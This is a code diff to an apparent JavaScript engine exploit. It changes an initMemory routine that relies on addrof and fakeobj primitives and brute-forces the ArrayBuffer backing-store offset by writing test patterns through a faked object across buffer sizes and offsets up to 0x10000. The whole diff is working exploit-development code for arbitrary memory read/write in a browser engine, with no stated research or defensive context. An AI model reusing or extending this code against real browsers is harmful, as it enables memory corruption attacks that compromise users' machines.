@@ -25,36 +25,44 @@ function write64(addr, value) {
  * Initialize memory primitives by finding the backing store offset and setting up DataView
  */
 async function initMemory(log) {
-    log('Searching for correct backing store offset...');
-    let start = 0n;
-    const maxOffset = 0x200n;
-    const testPattern = 0xdeadbeefcafebaben;
-    while (start < maxOffset) {
-        log(`Searching for BS offset starting at 0x${start.toString(16)}`);
-        let candidate;
-        try {
-            candidate = findBackingStoreOffset(log, start);
-            log(`Found offset candidate: 0x${candidate.toString(16)}`);
-            // Setup test buffer
-            buf = new ArrayBuffer(0x100);
-            dv = new DataView(buf);
-            const bufAddr = addrof(buf);
-            bsPtrAddr = bufAddr + candidate;
-            // Test write/read
-            const fake = fakeobj(bsPtrAddr);
-            fake[0] = testPattern;
-            const readBack = dv.getBigUint64(0, true);
-            if (readBack === testPattern) {
-                BS_OFFSET = candidate;
-                initialized = true;
-                log(`Verified BS offset: 0x${BS_OFFSET.toString(16)}`);
-                return;
+    log('Starting extended scan for ArrayBuffer backing store offset...');
+    const patterns = [
+        0x4142434445464748n, // 'ABCDEFGH'
+        0xdeadbeefcafebaben,
+        0x1122334455667788n
+    ];
+    const bufferSizes = [0x100, 0x200, 0x1000];
+    const maxOffset = 0x10000n;
+    let tested = 0;    
+    for (const size of bufferSizes) {
+        log(`Trying buffer size ${size} bytes`);
+        for (const pattern of patterns) {
+            log(`Testing pattern 0x${pattern.toString(16)}`);
+            for (let off = 0n; off < maxOffset; off += 8n) {
+                if ((off & 0xFFn) === 0n) {
+                    log(`Offset scan at 0x${off.toString(16)} (${tested} tests done)`);
+                }
+                tested++;
+                // Allocate buffer and DataView
+                buf = new ArrayBuffer(size);
+                dv = new DataView(buf);
+                const bufAddr = addrof(buf);
+                bsPtrAddr = bufAddr + off;
+                try {
+                    const fake = fakeobj(bsPtrAddr);
+                    fake[0] = pattern;
+                    const readBack = dv.getBigUint64(0, true);
+                    if (readBack === pattern) {
+                        BS_OFFSET = off;
+                        initialized = true;
+                        log(`Success! Buffer size ${size}, pattern 0x${pattern.toString(16)}, offset 0x${off.toString(16)}`);
+                        return;
+                    }
+                } catch(e) {
+                    // skip invalid offsets
+                }
             }
-            log(`Offset 0x${candidate.toString(16)} failed, trying next...`);
-            start = candidate + 8n;
-        } catch(e) {
-            break;
         }
     }
-    throw new Error('Unable to find valid backing store offset');
+    throw new Error('Unable to find valid backing store offset after ' + tested + ' attempts');
 }
